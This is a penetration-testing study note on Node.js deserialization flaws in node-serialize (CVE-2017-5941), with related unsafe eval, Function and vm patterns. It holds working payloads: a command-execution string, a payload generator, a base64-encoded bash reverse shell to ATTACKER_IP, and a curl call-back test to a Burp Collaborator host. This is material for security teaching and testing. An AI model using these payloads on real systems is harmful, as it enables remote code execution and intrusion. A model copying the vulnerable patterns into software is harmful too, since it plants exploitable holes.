---
tags: [vapt, deserialization, nodejs, intermediate]
difficulty: intermediate
module: "15 - Deserialization"
topic: "15.07 Node.js Deserialization (node-serialize)"
---

# 15.07 — Node.js Deserialization

## The node-serialize Vulnerability

```javascript
// node-serialize PACKAGE WAS VULNERABLE (CVE-2017-5941):
// npm install node-serialize

const serialize = require('node-serialize');

// Serialization:
const user = {name: 'alice', role: 'user'};
const serialized = serialize.serialize(user);
// → {"name":"alice","role":"user"}

// Deserialization:
const user = serialize.unserialize(serialized);

// THE VULNERABILITY:
// node-serialize supports serializing FUNCTIONS using IIFE syntax:
// {"name": "_$$ND_FUNC$$_function(){ return 'hello'; }()"}
// → When deserialized, the function IS EXECUTED!

// RCE PAYLOAD:
const malicious = '{"rce":"_$$ND_FUNC$$_function(){return require(\'child_process\').exec(\'id\',function(error,stdout,stderr){console.log(stdout)});}()"}';
serialize.unserialize(malicious);  // → EXECUTES id!
```

---

## Crafting the Payload

```javascript
// NODE-SERIALIZE RCE PAYLOAD GENERATOR:

function generate_payload(cmd) {
  const iife = `_$$ND_FUNC$$_function (){require('child_process').exec('${cmd}',function(error,stdout,stderr){console.log(stdout)});}()`;
  return JSON.stringify({rce: iife});
}

// REVERSE SHELL:
const revshell = generate_payload(
  "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
);

// ENCODED FOR COOKIE/BASE64:
const encoded = Buffer.from(revshell).toString('base64');
console.log(encoded);
```

---

## Finding node-serialize in Apps

```bash
# LOOK FOR IN COOKIE OR POST BODY:
# JSON object that was serialized with node-serialize

# IDENTIFY:
# Check if cookie/body contains JSON with curly braces
# Try to inject IIFE syntax

# TEST PAYLOAD:
# {"test":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://YOUR_BURP_COLLABORATOR');}()"}

# ENCODE AS BASE64:
echo -n '{"test":"_$$ND_FUNC$$_function(){require('"'"'child_process'"'"').exec('"'"'curl http://COLLAB.burpcollaborator.net'"'"');}()"}' | base64

# IF COLLABORATOR RECEIVES REQUEST → VULNERABLE!
```

---

## Related node.js Deserialization Issues

```javascript
// 1. JAVASCRIPT OBJECT NOTATION (JSON) PROTOTYPE POLLUTION:
// Not classic deserialization, but related (covered in Module 10)

// 2. EVAL ON JSON:
// BAD CODE:
const data = eval('(' + req.body.json + ')');
// → If JSON contains function expression → executes!

// 3. vm.runInNewContext WITH UNSANITIZED INPUT:
const vm = require('vm');
const result = vm.runInNewContext(userInput);
// → May escape sandbox depending on Node.js version!

// 4. FUNCTION CONSTRUCTOR:
const fn = new Function('return ' + userInput)();
// → Executes arbitrary JavaScript!

// ALL OF THESE ARE CODE EXECUTION VIA UNTRUSTED DATA:
// Test by injecting: (function(){require('child_process').exec('id')})()
```

---

## Modern Node.js Serialization (serialize-javascript)

```javascript
// serialize-javascript PACKAGE (safer, but still test it):
// const serialize = require('serialize-javascript');
// serialize({fn: function() { return 1; }});
// → '{"fn":function() { return 1; }}'

// DESER USING EVAL (dangerous!):
// const obj = eval('(' + serialized + ')');
// → If serialized contains malicious function → RCE!

// LOOK FOR IN SOURCE CODE:
// grep -r "eval(" node_modules/ or app source
// grep -r "unserialize\|deserialize\|JSON.parse" app/
```

---

## Related Notes
- [[01 - What is Serialization and Deserialization]] — fundamentals
- [[Module 10 - Prototype Pollution]] — JS prototype chain attacks
- [[12 - Defense Avoid Untrusted Deserialization]] — defense
